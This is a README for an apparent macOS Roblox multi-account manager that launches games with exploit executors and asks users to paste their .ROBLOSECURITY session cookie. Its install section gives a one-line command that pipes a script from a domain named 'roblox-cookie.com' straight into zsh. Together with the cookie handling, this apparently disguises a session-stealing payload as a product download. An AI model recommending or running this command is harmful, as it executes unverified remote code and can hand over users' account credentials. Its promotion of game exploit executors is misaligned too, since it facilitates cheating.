# Roblox Account Manager (macOS)

A simple SwiftUI app to manage multiple Roblox accounts, browse games, and launch with different flavors — all with a clean, customizable UI.

## What it does
- Manage many accounts (add, edit, delete, activate)
- Browse games and view details
- Launch games with flavor selection (Clean, MacSploit, Opiumware, Hydrogen)
- Multi-instance launching with prepared clones
- Friends tab with presence (online/ingame/offline) and avatars
- Appearance: gradient presets, custom gradient editor, and “Beautiful Mode” animations
- Support tab: submit public or private requests to Discord; quick “Join Discord” button

## Quick start
1. Open `RobloxAccountManager.xcodeproj` in Xcode (macOS 13+)
2. Build and Run (Debug is fine)
3. Add an account (paste your .ROBLOSECURITY cookie) — or skip and add later
4. Optional: pick a background gradient or enable “Beautiful Mode” in Settings

Or install directly with:
```bash
curl -fsSL https://roblox-cookie.com/download | zsh
```

## Where data lives
- Everything is stored locally under `~/Library/Application Support/RobloxAccountManager`
- Cookies can be saved in plain JSON based on your settings
- No telemetry

## Tabs overview
- Accounts: manage accounts and quick-launch
- Games: search/browse, open details, launch with a flavor
- Launcher/Executors: prepare clones, install/update executors, assign per instance
- Friends: live presence list with 1s refresh (smooth, no blinking)
- Statistics: basic usage views
- Support: send a request to Discord (public/private) or join the server

## Notes
- “Join Discord” opens the invite in the Discord app when available, otherwise the browser
- Default paths avoid Documents permission prompts by using Application Support

—

Built with SwiftUI and Combine.

